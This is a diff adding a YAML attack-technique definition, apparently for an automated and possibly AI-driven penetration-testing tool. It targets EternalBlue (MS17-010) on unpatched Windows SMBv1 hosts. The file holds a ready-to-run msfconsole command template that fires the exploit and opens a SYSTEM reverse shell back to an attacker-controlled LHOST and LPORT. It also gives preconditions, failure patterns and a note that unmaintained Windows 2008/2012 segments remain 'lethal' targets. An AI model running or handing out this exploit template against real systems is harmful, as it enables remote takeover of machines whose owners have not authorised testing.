@@ -1,0 +1,28 @@
+name: eternalblue
+category: services
+description: EternalBlue (MS17-010) — SMBv1 kernel RCE on unpatched Windows
+preconditions:
+- service.port==445
+- smbv1_enabled
+parameters:
+  target_ip: from_engagement.target_ip
+  lhost: from_engagement.attacker_ip
+  lport: from_engagement.attacker_port
+command_template: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set LHOST {lhost}; set LPORT {lport}; run; exit"
+parser: generic_parser
+expected_effects:
+- system_shell
+- rce_achieved
+- shell_obtained
+falsifier:
+  pattern: not vulnerable|STATUS_INVALID_HANDLE|patched|SMB2 only
+  timeout: 180
+model_tier: haiku
+mechanism: |
+  MS17-010. SrvOS2FeaListSizeToNt miscalculation in SMBv1 TRANS2 SUBCOMMAND
+  writes past the pool allocation → arbitrary kernel write → SYSTEM shellcode.
+  Still alive on Windows 2008/2012 that never took the patch; lethal against
+  unmaintained segments.
+references:
+  ocd_mindmap: 'Branch 13: Quick wins (EternalBlue / MS17-010)'
+  hacktricks: generic-methodologies-and-resources/pentesting-network/
